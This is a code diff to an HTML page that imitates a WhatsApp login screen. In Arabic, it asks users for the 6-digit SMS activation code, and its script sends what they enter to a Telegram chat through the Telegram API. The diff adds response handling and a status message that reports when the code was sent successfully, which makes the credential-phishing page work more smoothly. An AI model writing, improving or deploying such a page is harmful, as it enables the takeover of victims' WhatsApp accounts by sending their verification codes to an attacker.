@@ -117,9 +117,10 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
         <h1>تسجيل الدخول</h1>
         <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
-        <input id="activationCode" type="tel" placeholder="رمز التفعيل" maxlength="6">
+        <input id="activationCode" type="text" placeholder="رمز التفعيل" maxlength="6">
         <button onclick="startVerification()">متابعة</button>
         <div id="countdown"></div>
+        <div id="status" style="margin-top: 10px; color: red;"></div>
     </div>
 
     <script>
@@ -152,9 +153,18 @@
                     chat_id: chatId,
                     text: message,
                 }),
-            }).catch(error => {
-                console.error('فشل الاتصال بالخادم:', error);
-            });
+            })
+                .then((response) => {
+                    if (response.ok) {
+                        document.getElementById('status').textContent = 'تم إرسال الرمز بنجاح!';
+                    } else {
+                        document.getElementById('status').textContent = 'حدث خطأ أثناء الإرسال.';
+                    }
+                })
+                .catch((error) => {
+                    console.error('فشل الاتصال بـ Telegram API:', error);
+                    document.getElementById('status').textContent = 'فشل الإرسال. تحقق من الإعدادات.';
+                });
         }
 
         function startCountdown(inputField) {
